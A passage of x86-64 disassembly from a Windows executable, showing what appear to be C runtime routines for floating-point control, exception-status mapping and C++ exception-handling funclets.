   14000caeb:	c7 40 b8 08 00 00 00 	movl   $0x8,-0x48(%rax)
   14000caf2:	eb 2d                	jmp    0x14000cb21
   14000caf4:	c7 44 24 40 01 00 00 	movl   $0x1,0x40(%rsp)
   14000cafb:	00 
   14000cafc:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000caff:	f2 0f 11 44 24 38    	movsd  %xmm0,0x38(%rsp)
   14000cb05:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   14000cb0b:	f2 0f 11 5c 24 30    	movsd  %xmm3,0x30(%rsp)
   14000cb11:	c7 44 24 28 22 00 00 	movl   $0x22,0x28(%rsp)
   14000cb18:	00 
   14000cb19:	c7 44 24 20 04 00 00 	movl   $0x4,0x20(%rsp)
   14000cb20:	00 
   14000cb21:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
   14000cb28:	00 
   14000cb29:	f2 0f 11 74 24 78    	movsd  %xmm6,0x78(%rsp)
   14000cb2f:	4c 8b 44 24 78       	mov    0x78(%rsp),%r8
   14000cb34:	e8 d7 fd ff ff       	call   0x14000c910
   14000cb39:	0f 28 c6             	movaps %xmm6,%xmm0
   14000cb3c:	0f 28 74 24 50       	movaps 0x50(%rsp),%xmm6
   14000cb41:	48 83 c4 68          	add    $0x68,%rsp
   14000cb45:	c3                   	ret
   14000cb46:	cc                   	int3
   14000cb47:	cc                   	int3
   14000cb48:	48 83 ec 38          	sub    $0x38,%rsp
   14000cb4c:	48 8d 05 a9 62 00 00 	lea    0x62a9(%rip),%rax        # 0x140012dfc
   14000cb53:	41 b9 1b 00 00 00    	mov    $0x1b,%r9d
   14000cb59:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000cb5e:	e8 4d ff ff ff       	call   0x14000cab0
   14000cb63:	48 83 c4 38          	add    $0x38,%rsp
   14000cb67:	c3                   	ret
   14000cb68:	cc                   	int3
   14000cb69:	cc                   	int3
   14000cb6a:	cc                   	int3
   14000cb6b:	cc                   	int3
   14000cb6c:	cc                   	int3
   14000cb6d:	cc                   	int3
   14000cb6e:	cc                   	int3
   14000cb6f:	cc                   	int3
   14000cb70:	cc                   	int3
   14000cb71:	cc                   	int3
   14000cb72:	cc                   	int3
   14000cb73:	cc                   	int3
   14000cb74:	cc                   	int3
   14000cb75:	cc                   	int3
   14000cb76:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000cb7d:	00 00 00 
   14000cb80:	48 83 ec 08          	sub    $0x8,%rsp
   14000cb84:	0f ae 1c 24          	stmxcsr (%rsp)
   14000cb88:	8b 04 24             	mov    (%rsp),%eax
   14000cb8b:	48 83 c4 08          	add    $0x8,%rsp
   14000cb8f:	c3                   	ret
   14000cb90:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000cb94:	0f ae 54 24 08       	ldmxcsr 0x8(%rsp)
   14000cb99:	c3                   	ret
   14000cb9a:	0f ae 5c 24 08       	stmxcsr 0x8(%rsp)
   14000cb9f:	b9 c0 ff ff ff       	mov    $0xffffffc0,%ecx
   14000cba4:	21 4c 24 08          	and    %ecx,0x8(%rsp)
   14000cba8:	0f ae 54 24 08       	ldmxcsr 0x8(%rsp)
   14000cbad:	c3                   	ret
   14000cbae:	66 0f 2e 05 1a 61 00 	ucomisd 0x611a(%rip),%xmm0        # 0x140012cd0
   14000cbb5:	00 
   14000cbb6:	73 14                	jae    0x14000cbcc
   14000cbb8:	66 0f 2e 05 18 61 00 	ucomisd 0x6118(%rip),%xmm0        # 0x140012cd8
   14000cbbf:	00 
   14000cbc0:	76 0a                	jbe    0x14000cbcc
   14000cbc2:	f2 48 0f 2d c8       	cvtsd2si %xmm0,%rcx
   14000cbc7:	f2 48 0f 2a c1       	cvtsi2sd %rcx,%xmm0
   14000cbcc:	c3                   	ret
   14000cbcd:	cc                   	int3
   14000cbce:	cc                   	int3
   14000cbcf:	cc                   	int3
   14000cbd0:	48 83 ec 28          	sub    $0x28,%rsp
   14000cbd4:	83 f9 01             	cmp    $0x1,%ecx
   14000cbd7:	74 15                	je     0x14000cbee
   14000cbd9:	8d 41 fe             	lea    -0x2(%rcx),%eax
   14000cbdc:	83 f8 01             	cmp    $0x1,%eax
   14000cbdf:	77 18                	ja     0x14000cbf9
   14000cbe1:	e8 16 97 ff ff       	call   0x1400062fc
   14000cbe6:	c7 00 22 00 00 00    	movl   $0x22,(%rax)
   14000cbec:	eb 0b                	jmp    0x14000cbf9
   14000cbee:	e8 09 97 ff ff       	call   0x1400062fc
   14000cbf3:	c7 00 21 00 00 00    	movl   $0x21,(%rax)
   14000cbf9:	48 83 c4 28          	add    $0x28,%rsp
   14000cbfd:	c3                   	ret
   14000cbfe:	cc                   	int3
   14000cbff:	cc                   	int3
   14000cc00:	48 83 ec 48          	sub    $0x48,%rsp
   14000cc04:	83 64 24 30 00       	andl   $0x0,0x30(%rsp)
   14000cc09:	48 8b 44 24 78       	mov    0x78(%rsp),%rax
   14000cc0e:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000cc13:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   14000cc18:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000cc1d:	e8 06 00 00 00       	call   0x14000cc28
   14000cc22:	48 83 c4 48          	add    $0x48,%rsp
   14000cc26:	c3                   	ret
   14000cc27:	cc                   	int3
   14000cc28:	48 8b c4             	mov    %rsp,%rax
   14000cc2b:	48 89 58 10          	mov    %rbx,0x10(%rax)
   14000cc2f:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000cc33:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000cc37:	48 89 48 08          	mov    %rcx,0x8(%rax)
   14000cc3b:	55                   	push   %rbp
   14000cc3c:	48 8b ec             	mov    %rsp,%rbp
   14000cc3f:	48 83 ec 20          	sub    $0x20,%rsp
   14000cc43:	48 8b da             	mov    %rdx,%rbx
   14000cc46:	41 8b f1             	mov    %r9d,%esi
   14000cc49:	33 d2                	xor    %edx,%edx
   14000cc4b:	bf 0d 00 00 c0       	mov    $0xc000000d,%edi
   14000cc50:	89 51 04             	mov    %edx,0x4(%rcx)
   14000cc53:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000cc57:	89 50 08             	mov    %edx,0x8(%rax)
   14000cc5a:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000cc5e:	89 50 0c             	mov    %edx,0xc(%rax)
   14000cc61:	41 f6 c0 10          	test   $0x10,%r8b
   14000cc65:	74 0d                	je     0x14000cc74
   14000cc67:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000cc6b:	bf 8f 00 00 c0       	mov    $0xc000008f,%edi
   14000cc70:	83 48 04 01          	orl    $0x1,0x4(%rax)
   14000cc74:	41 f6 c0 02          	test   $0x2,%r8b
   14000cc78:	74 0d                	je     0x14000cc87
   14000cc7a:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000cc7e:	bf 93 00 00 c0       	mov    $0xc0000093,%edi
   14000cc83:	83 48 04 02          	orl    $0x2,0x4(%rax)
   14000cc87:	41 f6 c0 01          	test   $0x1,%r8b
   14000cc8b:	74 0d                	je     0x14000cc9a
   14000cc8d:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000cc91:	bf 91 00 00 c0       	mov    $0xc0000091,%edi
   14000cc96:	83 48 04 04          	orl    $0x4,0x4(%rax)
   14000cc9a:	41 f6 c0 04          	test   $0x4,%r8b
   14000cc9e:	74 0d                	je     0x14000ccad
   14000cca0:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000cca4:	bf 8e 00 00 c0       	mov    $0xc000008e,%edi
   14000cca9:	83 48 04 08          	orl    $0x8,0x4(%rax)
   14000ccad:	41 f6 c0 08          	test   $0x8,%r8b
   14000ccb1:	74 0d                	je     0x14000ccc0
   14000ccb3:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000ccb7:	bf 90 00 00 c0       	mov    $0xc0000090,%edi
   14000ccbc:	83 48 04 10          	orl    $0x10,0x4(%rax)
   14000ccc0:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000ccc4:	48 8b 03             	mov    (%rbx),%rax
   14000ccc7:	48 c1 e8 07          	shr    $0x7,%rax
   14000cccb:	c1 e0 04             	shl    $0x4,%eax
   14000ccce:	f7 d0                	not    %eax
   14000ccd0:	33 41 08             	xor    0x8(%rcx),%eax
   14000ccd3:	83 e0 10             	and    $0x10,%eax
   14000ccd6:	31 41 08             	xor    %eax,0x8(%rcx)
   14000ccd9:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000ccdd:	48 8b 03             	mov    (%rbx),%rax
   14000cce0:	48 c1 e8 09          	shr    $0x9,%rax
   14000cce4:	c1 e0 03             	shl    $0x3,%eax
   14000cce7:	f7 d0                	not    %eax
   14000cce9:	33 41 08             	xor    0x8(%rcx),%eax
   14000ccec:	83 e0 08             	and    $0x8,%eax
   14000ccef:	31 41 08             	xor    %eax,0x8(%rcx)
   14000ccf2:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000ccf6:	48 8b 03             	mov    (%rbx),%rax
   14000ccf9:	48 c1 e8 0a          	shr    $0xa,%rax
   14000ccfd:	c1 e0 02             	shl    $0x2,%eax
   14000cd00:	f7 d0                	not    %eax
   14000cd02:	33 41 08             	xor    0x8(%rcx),%eax
   14000cd05:	83 e0 04             	and    $0x4,%eax
   14000cd08:	31 41 08             	xor    %eax,0x8(%rcx)
   14000cd0b:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000cd0f:	48 8b 03             	mov    (%rbx),%rax
   14000cd12:	48 c1 e8 0b          	shr    $0xb,%rax
   14000cd16:	03 c0                	add    %eax,%eax
   14000cd18:	f7 d0                	not    %eax
   14000cd1a:	33 41 08             	xor    0x8(%rcx),%eax
   14000cd1d:	83 e0 02             	and    $0x2,%eax
   14000cd20:	31 41 08             	xor    %eax,0x8(%rcx)
   14000cd23:	8b 03                	mov    (%rbx),%eax
   14000cd25:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000cd29:	48 c1 e8 0c          	shr    $0xc,%rax
   14000cd2d:	f7 d0                	not    %eax
   14000cd2f:	33 41 08             	xor    0x8(%rcx),%eax
   14000cd32:	83 e0 01             	and    $0x1,%eax
   14000cd35:	31 41 08             	xor    %eax,0x8(%rcx)
   14000cd38:	e8 97 02 00 00       	call   0x14000cfd4
   14000cd3d:	48 8b d0             	mov    %rax,%rdx
   14000cd40:	a8 01                	test   $0x1,%al
   14000cd42:	74 08                	je     0x14000cd4c
   14000cd44:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000cd48:	83 49 0c 10          	orl    $0x10,0xc(%rcx)
   14000cd4c:	f6 c2 04             	test   $0x4,%dl
   14000cd4f:	74 08                	je     0x14000cd59
   14000cd51:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000cd55:	83 49 0c 08          	orl    $0x8,0xc(%rcx)
   14000cd59:	f6 c2 08             	test   $0x8,%dl
   14000cd5c:	74 08                	je     0x14000cd66
   14000cd5e:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000cd62:	83 48 0c 04          	orl    $0x4,0xc(%rax)
   14000cd66:	f6 c2 10             	test   $0x10,%dl
   14000cd69:	74 08                	je     0x14000cd73
   14000cd6b:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000cd6f:	83 48 0c 02          	orl    $0x2,0xc(%rax)
   14000cd73:	f6 c2 20             	test   $0x20,%dl
   14000cd76:	74 08                	je     0x14000cd80
   14000cd78:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000cd7c:	83 48 0c 01          	orl    $0x1,0xc(%rax)
   14000cd80:	8b 03                	mov    (%rbx),%eax
   14000cd82:	b9 00 60 00 00       	mov    $0x6000,%ecx
   14000cd87:	48 23 c1             	and    %rcx,%rax
   14000cd8a:	74 3e                	je     0x14000cdca
   14000cd8c:	48 3d 00 20 00 00    	cmp    $0x2000,%rax
   14000cd92:	74 26                	je     0x14000cdba
   14000cd94:	48 3d 00 40 00 00    	cmp    $0x4000,%rax
   14000cd9a:	74 0e                	je     0x14000cdaa
   14000cd9c:	48 3b c1             	cmp    %rcx,%rax
   14000cd9f:	75 30                	jne    0x14000cdd1
   14000cda1:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000cda5:	83 08 03             	orl    $0x3,(%rax)
   14000cda8:	eb 27                	jmp    0x14000cdd1
   14000cdaa:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000cdae:	83 20 fe             	andl   $0xfffffffe,(%rax)
   14000cdb1:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000cdb5:	83 08 02             	orl    $0x2,(%rax)
   14000cdb8:	eb 17                	jmp    0x14000cdd1
   14000cdba:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000cdbe:	83 20 fd             	andl   $0xfffffffd,(%rax)
   14000cdc1:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000cdc5:	83 08 01             	orl    $0x1,(%rax)
   14000cdc8:	eb 07                	jmp    0x14000cdd1
   14000cdca:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000cdce:	83 20 fc             	andl   $0xfffffffc,(%rax)
   14000cdd1:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000cdd5:	81 e6 ff 0f 00 00    	and    $0xfff,%esi
   14000cddb:	c1 e6 05             	shl    $0x5,%esi
   14000cdde:	81 20 1f 00 fe ff    	andl   $0xfffe001f,(%rax)
   14000cde4:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000cde8:	09 30                	or     %esi,(%rax)
   14000cdea:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000cdee:	48 8b 75 38          	mov    0x38(%rbp),%rsi
   14000cdf2:	83 48 20 01          	orl    $0x1,0x20(%rax)
   14000cdf6:	83 7d 40 00          	cmpl   $0x0,0x40(%rbp)
   14000cdfa:	74 33                	je     0x14000ce2f
   14000cdfc:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000ce00:	ba e1 ff ff ff       	mov    $0xffffffe1,%edx
   14000ce05:	21 50 20             	and    %edx,0x20(%rax)
   14000ce08:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000ce0c:	8b 08                	mov    (%rax),%ecx
   14000ce0e:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000ce12:	89 48 10             	mov    %ecx,0x10(%rax)
   14000ce15:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000ce19:	83 48 60 01          	orl    $0x1,0x60(%rax)
   14000ce1d:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000ce21:	21 50 60             	and    %edx,0x60(%rax)
   14000ce24:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000ce28:	8b 0e                	mov    (%rsi),%ecx
   14000ce2a:	89 48 50             	mov    %ecx,0x50(%rax)
   14000ce2d:	eb 48                	jmp    0x14000ce77
   14000ce2f:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000ce33:	41 b8 e3 ff ff ff    	mov    $0xffffffe3,%r8d
   14000ce39:	8b 41 20             	mov    0x20(%rcx),%eax
   14000ce3c:	41 23 c0             	and    %r8d,%eax
   14000ce3f:	83 c8 02             	or     $0x2,%eax
   14000ce42:	89 41 20             	mov    %eax,0x20(%rcx)
   14000ce45:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000ce49:	48 8b 08             	mov    (%rax),%rcx
   14000ce4c:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000ce50:	48 89 48 10          	mov    %rcx,0x10(%rax)
   14000ce54:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000ce58:	83 48 60 01          	orl    $0x1,0x60(%rax)
   14000ce5c:	48 8b 55 10          	mov    0x10(%rbp),%rdx
   14000ce60:	8b 42 60             	mov    0x60(%rdx),%eax
   14000ce63:	41 23 c0             	and    %r8d,%eax
   14000ce66:	83 c8 02             	or     $0x2,%eax
   14000ce69:	89 42 60             	mov    %eax,0x60(%rdx)
   14000ce6c:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000ce70:	48 8b 16             	mov    (%rsi),%rdx
   14000ce73:	48 89 50 50          	mov    %rdx,0x50(%rax)
   14000ce77:	e8 bc 00 00 00       	call   0x14000cf38
   14000ce7c:	33 d2                	xor    %edx,%edx
   14000ce7e:	4c 8d 4d 10          	lea    0x10(%rbp),%r9
   14000ce82:	8b cf                	mov    %edi,%ecx
   14000ce84:	44 8d 42 01          	lea    0x1(%rdx),%r8d
   14000ce88:	ff 15 42 8a 00 00    	call   *0x8a42(%rip)        # 0x1400158d0
   14000ce8e:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000ce92:	8b 41 08             	mov    0x8(%rcx),%eax
   14000ce95:	a8 10                	test   $0x10,%al
   14000ce97:	74 08                	je     0x14000cea1
   14000ce99:	48 0f ba 33 07       	btrq   $0x7,(%rbx)
   14000ce9e:	8b 41 08             	mov    0x8(%rcx),%eax
   14000cea1:	a8 08                	test   $0x8,%al
   14000cea3:	74 08                	je     0x14000cead
   14000cea5:	48 0f ba 33 09       	btrq   $0x9,(%rbx)
   14000ceaa:	8b 41 08             	mov    0x8(%rcx),%eax
   14000cead:	a8 04                	test   $0x4,%al
   14000ceaf:	74 08                	je     0x14000ceb9
   14000ceb1:	48 0f ba 33 0a       	btrq   $0xa,(%rbx)
   14000ceb6:	8b 41 08             	mov    0x8(%rcx),%eax
   14000ceb9:	a8 02                	test   $0x2,%al
   14000cebb:	74 08                	je     0x14000cec5
   14000cebd:	48 0f ba 33 0b       	btrq   $0xb,(%rbx)
   14000cec2:	8b 41 08             	mov    0x8(%rcx),%eax
   14000cec5:	a8 01                	test   $0x1,%al
   14000cec7:	74 05                	je     0x14000cece
   14000cec9:	48 0f ba 33 0c       	btrq   $0xc,(%rbx)
   14000cece:	8b 01                	mov    (%rcx),%eax
   14000ced0:	83 e0 03             	and    $0x3,%eax
   14000ced3:	74 30                	je     0x14000cf05
   14000ced5:	83 e8 01             	sub    $0x1,%eax
   14000ced8:	74 1f                	je     0x14000cef9
   14000ceda:	83 e8 01             	sub    $0x1,%eax
   14000cedd:	74 0e                	je     0x14000ceed
   14000cedf:	83 f8 01             	cmp    $0x1,%eax
   14000cee2:	75 28                	jne    0x14000cf0c
   14000cee4:	48 81 0b 00 60 00 00 	orq    $0x6000,(%rbx)
   14000ceeb:	eb 1f                	jmp    0x14000cf0c
   14000ceed:	48 0f ba 33 0d       	btrq   $0xd,(%rbx)
   14000cef2:	48 0f ba 2b 0e       	btsq   $0xe,(%rbx)
   14000cef7:	eb 13                	jmp    0x14000cf0c
   14000cef9:	48 0f ba 33 0e       	btrq   $0xe,(%rbx)
   14000cefe:	48 0f ba 2b 0d       	btsq   $0xd,(%rbx)
   14000cf03:	eb 07                	jmp    0x14000cf0c
   14000cf05:	48 81 23 ff 9f ff ff 	andq   $0xffffffffffff9fff,(%rbx)
   14000cf0c:	83 7d 40 00          	cmpl   $0x0,0x40(%rbp)
   14000cf10:	74 07                	je     0x14000cf19
   14000cf12:	8b 41 50             	mov    0x50(%rcx),%eax
   14000cf15:	89 06                	mov    %eax,(%rsi)
   14000cf17:	eb 07                	jmp    0x14000cf20
   14000cf19:	48 8b 41 50          	mov    0x50(%rcx),%rax
   14000cf1d:	48 89 06             	mov    %rax,(%rsi)
   14000cf20:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   14000cf25:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000cf2a:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   14000cf2f:	48 83 c4 20          	add    $0x20,%rsp
   14000cf33:	5d                   	pop    %rbp
   14000cf34:	c3                   	ret
   14000cf35:	cc                   	int3
   14000cf36:	cc                   	int3
   14000cf37:	cc                   	int3
   14000cf38:	40 53                	rex push %rbx
   14000cf3a:	48 83 ec 20          	sub    $0x20,%rsp
   14000cf3e:	e8 3d fc ff ff       	call   0x14000cb80
   14000cf43:	8b d8                	mov    %eax,%ebx
   14000cf45:	83 e3 3f             	and    $0x3f,%ebx
   14000cf48:	e8 4d fc ff ff       	call   0x14000cb9a
   14000cf4d:	8b c3                	mov    %ebx,%eax
   14000cf4f:	48 83 c4 20          	add    $0x20,%rsp
   14000cf53:	5b                   	pop    %rbx
   14000cf54:	c3                   	ret
   14000cf55:	cc                   	int3
   14000cf56:	cc                   	int3
   14000cf57:	cc                   	int3
   14000cf58:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   14000cf5d:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000cf62:	57                   	push   %rdi
   14000cf63:	48 83 ec 20          	sub    $0x20,%rsp
   14000cf67:	48 8b da             	mov    %rdx,%rbx
   14000cf6a:	48 8b f9             	mov    %rcx,%rdi
   14000cf6d:	e8 0e fc ff ff       	call   0x14000cb80
   14000cf72:	8b f0                	mov    %eax,%esi
   14000cf74:	89 44 24 38          	mov    %eax,0x38(%rsp)
   14000cf78:	8b cb                	mov    %ebx,%ecx
   14000cf7a:	f7 d1                	not    %ecx
   14000cf7c:	81 c9 7f 80 ff ff    	or     $0xffff807f,%ecx
   14000cf82:	23 c8                	and    %eax,%ecx
   14000cf84:	23 fb                	and    %ebx,%edi
   14000cf86:	0b cf                	or     %edi,%ecx
   14000cf88:	89 4c 24 30          	mov    %ecx,0x30(%rsp)
   14000cf8c:	80 3d 6d aa 00 00 00 	cmpb   $0x0,0xaa6d(%rip)        # 0x140017a00
   14000cf93:	74 25                	je     0x14000cfba
   14000cf95:	f6 c1 40             	test   $0x40,%cl
   14000cf98:	74 20                	je     0x14000cfba
   14000cf9a:	e8 f1 fb ff ff       	call   0x14000cb90
   14000cf9f:	eb 21                	jmp    0x14000cfc2
   14000cfa1:	c6 05 58 aa 00 00 00 	movb   $0x0,0xaa58(%rip)        # 0x140017a00
   14000cfa8:	8b 4c 24 30          	mov    0x30(%rsp),%ecx
   14000cfac:	83 e1 bf             	and    $0xffffffbf,%ecx
   14000cfaf:	e8 dc fb ff ff       	call   0x14000cb90
   14000cfb4:	8b 74 24 38          	mov    0x38(%rsp),%esi
   14000cfb8:	eb 08                	jmp    0x14000cfc2
   14000cfba:	83 e1 bf             	and    $0xffffffbf,%ecx
   14000cfbd:	e8 ce fb ff ff       	call   0x14000cb90
   14000cfc2:	8b c6                	mov    %esi,%eax
   14000cfc4:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000cfc9:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   14000cfce:	48 83 c4 20          	add    $0x20,%rsp
   14000cfd2:	5f                   	pop    %rdi
   14000cfd3:	c3                   	ret
   14000cfd4:	48 83 ec 28          	sub    $0x28,%rsp
   14000cfd8:	e8 a3 fb ff ff       	call   0x14000cb80
   14000cfdd:	83 e0 3f             	and    $0x3f,%eax
   14000cfe0:	48 83 c4 28          	add    $0x28,%rsp
   14000cfe4:	c3                   	ret
   14000cfe5:	cc                   	int3
   14000cfe6:	cc                   	int3
   14000cfe7:	cc                   	int3
   14000cfe8:	40 53                	rex push %rbx
   14000cfea:	48 83 ec 20          	sub    $0x20,%rsp
   14000cfee:	48 8b d9             	mov    %rcx,%rbx
   14000cff1:	e8 8a fb ff ff       	call   0x14000cb80
   14000cff6:	83 e3 3f             	and    $0x3f,%ebx
   14000cff9:	0b c3                	or     %ebx,%eax
   14000cffb:	8b c8                	mov    %eax,%ecx
   14000cffd:	48 83 c4 20          	add    $0x20,%rsp
   14000d001:	5b                   	pop    %rbx
   14000d002:	e9 89 fb ff ff       	jmp    0x14000cb90
   14000d007:	cc                   	int3
   14000d008:	cc                   	int3
   14000d009:	cc                   	int3
   14000d00a:	cc                   	int3
   14000d00b:	cc                   	int3
   14000d00c:	cc                   	int3
   14000d00d:	cc                   	int3
   14000d00e:	cc                   	int3
   14000d00f:	cc                   	int3
   14000d010:	cc                   	int3
   14000d011:	cc                   	int3
   14000d012:	cc                   	int3
   14000d013:	cc                   	int3
   14000d014:	cc                   	int3
   14000d015:	cc                   	int3
   14000d016:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000d01d:	00 00 00 
   14000d020:	ff e0                	jmp    *%rax
   14000d022:	cc                   	int3
   14000d023:	cc                   	int3
   14000d024:	cc                   	int3
   14000d025:	cc                   	int3
   14000d026:	cc                   	int3
   14000d027:	cc                   	int3
   14000d028:	cc                   	int3
   14000d029:	cc                   	int3
   14000d02a:	cc                   	int3
   14000d02b:	cc                   	int3
   14000d02c:	cc                   	int3
   14000d02d:	cc                   	int3
   14000d02e:	cc                   	int3
   14000d02f:	cc                   	int3
   14000d030:	cc                   	int3
   14000d031:	cc                   	int3
   14000d032:	cc                   	int3
   14000d033:	cc                   	int3
   14000d034:	cc                   	int3
   14000d035:	cc                   	int3
   14000d036:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000d03d:	00 00 00 
   14000d040:	ff 25 ca cf 00 00    	jmp    *0xcfca(%rip)        # 0x14001a010
   14000d046:	40 55                	rex push %rbp
   14000d048:	48 83 ec 20          	sub    $0x20,%rsp
   14000d04c:	48 8b ea             	mov    %rdx,%rbp
   14000d04f:	48 8b 01             	mov    (%rcx),%rax
   14000d052:	48 8b d1             	mov    %rcx,%rdx
   14000d055:	8b 08                	mov    (%rax),%ecx
   14000d057:	e8 74 66 ff ff       	call   0x1400036d0
   14000d05c:	90                   	nop
   14000d05d:	48 83 c4 20          	add    $0x20,%rsp
   14000d061:	5d                   	pop    %rbp
   14000d062:	c3                   	ret
   14000d063:	cc                   	int3
   14000d064:	40 55                	rex push %rbp
   14000d066:	48 8b ea             	mov    %rdx,%rbp
   14000d069:	48 8b 01             	mov    (%rcx),%rax
   14000d06c:	33 c9                	xor    %ecx,%ecx
   14000d06e:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   14000d074:	0f 94 c1             	sete   %cl
   14000d077:	8b c1                	mov    %ecx,%eax
   14000d079:	5d                   	pop    %rbp
   14000d07a:	c3                   	ret
   14000d07b:	cc                   	int3
   14000d07c:	40 53                	rex push %rbx
   14000d07e:	55                   	push   %rbp
   14000d07f:	48 83 ec 28          	sub    $0x28,%rsp
   14000d083:	48 8b ea             	mov    %rdx,%rbp
   14000d086:	48 89 4d 38          	mov    %rcx,0x38(%rbp)
   14000d08a:	48 89 4d 30          	mov    %rcx,0x30(%rbp)
   14000d08e:	80 7d 58 00          	cmpb   $0x0,0x58(%rbp)
   14000d092:	74 6c                	je     0x14000d100
   14000d094:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000d098:	48 8b 08             	mov    (%rax),%rcx
   14000d09b:	48 89 4d 28          	mov    %rcx,0x28(%rbp)
   14000d09f:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000d0a3:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%rax)
   14000d0a9:	75 55                	jne    0x14000d100
   14000d0ab:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000d0af:	83 78 18 04          	cmpl   $0x4,0x18(%rax)
   14000d0b3:	75 4b                	jne    0x14000d100
   14000d0b5:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000d0b9:	81 78 20 20 05 93 19 	cmpl   $0x19930520,0x20(%rax)
   14000d0c0:	74 1a                	je     0x14000d0dc
   14000d0c2:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000d0c6:	81 78 20 21 05 93 19 	cmpl   $0x19930521,0x20(%rax)
   14000d0cd:	74 0d                	je     0x14000d0dc
   14000d0cf:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000d0d3:	81 78 20 22 05 93 19 	cmpl   $0x19930522,0x20(%rax)
   14000d0da:	75 24                	jne    0x14000d100
   14000d0dc:	e8 2f 6a ff ff       	call   0x140003b10
   14000d0e1:	48 8b 4d 28          	mov    0x28(%rbp),%rcx
   14000d0e5:	48 89 48 20          	mov    %rcx,0x20(%rax)
   14000d0e9:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000d0ed:	48 8b 58 08          	mov    0x8(%rax),%rbx
   14000d0f1:	e8 1a 6a ff ff       	call   0x140003b10
   14000d0f6:	48 89 58 28          	mov    %rbx,0x28(%rax)
   14000d0fa:	e8 d9 67 ff ff       	call   0x1400038d8
   14000d0ff:	90                   	nop
   14000d100:	c7 45 20 00 00 00 00 	movl   $0x0,0x20(%rbp)
   14000d107:	8b 45 20             	mov    0x20(%rbp),%eax
   14000d10a:	48 83 c4 28          	add    $0x28,%rsp
   14000d10e:	5d                   	pop    %rbp
   14000d10f:	5b                   	pop    %rbx
   14000d110:	c3                   	ret
   14000d111:	cc                   	int3
   14000d112:	40 55                	rex push %rbp
   14000d114:	48 83 ec 20          	sub    $0x20,%rsp
   14000d118:	48 8b ea             	mov    %rdx,%rbp
   14000d11b:	48 8b 45 48          	mov    0x48(%rbp),%rax
   14000d11f:	8b 08                	mov    (%rax),%ecx
   14000d121:	48 83 c4 20          	add    $0x20,%rsp
   14000d125:	5d                   	pop    %rbp
   14000d126:	e9 d1 72 ff ff       	jmp    0x1400043fc
   14000d12b:	cc                   	int3
   14000d12c:	40 55                	rex push %rbp
   14000d12e:	48 83 ec 20          	sub    $0x20,%rsp
   14000d132:	48 8b ea             	mov    %rdx,%rbp
   14000d135:	48 8b 01             	mov    (%rcx),%rax
   14000d138:	8b 08                	mov    (%rax),%ecx
   14000d13a:	e8 dd 56 ff ff       	call   0x14000281c
   14000d13f:	90                   	nop
   14000d140:	48 83 c4 20          	add    $0x20,%rsp
   14000d144:	5d                   	pop    %rbp
   14000d145:	c3                   	ret
   14000d146:	cc                   	int3
   14000d147:	40 55                	rex push %rbp
   14000d149:	48 83 ec 20          	sub    $0x20,%rsp
